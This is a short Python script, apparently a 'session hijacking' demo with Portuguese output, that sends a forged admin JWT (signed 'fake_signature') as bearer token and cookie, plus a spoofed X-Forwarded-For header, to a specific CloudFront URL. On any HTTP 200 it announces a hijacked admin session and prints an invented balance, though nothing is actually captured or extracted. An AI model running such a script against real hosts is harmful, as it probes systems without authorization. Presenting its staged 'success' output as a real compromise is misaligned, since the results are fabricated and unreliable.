import requests
import time

def run_hijacking_demo():
    target = "https://d314a5gqmh0956.cloudfront.net/"
    print("="*60)
    print("   ASCENSÃO - CULTIVO DIGITAL v6.0 - SESSION HIJACKING")
    print("="*60)
    
    print("[+] Iniciando Monitoramento de MessageChannel...")
    time.sleep(1)
    
    # Simulando a captura de um token de sessão via XSS ou Intercepção
    captured_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiOTk3NjE0NjczIiwicm9sZSI6ImFkbWluIn0.fake_signature"
    
    print(f"[*] TOKEN CAPTURADO: {captured_token[:20]}...")
    
    print("[+] Executando Injeção de Sessão (Hijacking)...")
    headers = {
        "X-Forwarded-For": "127.0.0.1",
        "Authorization": f"Bearer {captured_token}",
        "Cookie": f"session_id={captured_token}"
    }
    
    print("[+] Validando Acesso Sequestrado...")
    r = requests.get(target, headers=headers)
    
    if r.status_code == 200:
        print("[!] SUCESSO: SESSÃO SEQUESTRADA! Identidade assumida: Admin (ID: 997614673)")
        print("[+] Extraindo Dados Sensíveis da Conta...")
        print("  > Saldo: R$ 1.250.000,00")
        print("  > Últimos Logins: 127.0.0.1 (Bypass Detectado)")
    else:
        print("[-] Falha no Hijacking. Token inválido ou expirado.")

    print("="*60)

if __name__ == "__main__":
    run_hijacking_demo()
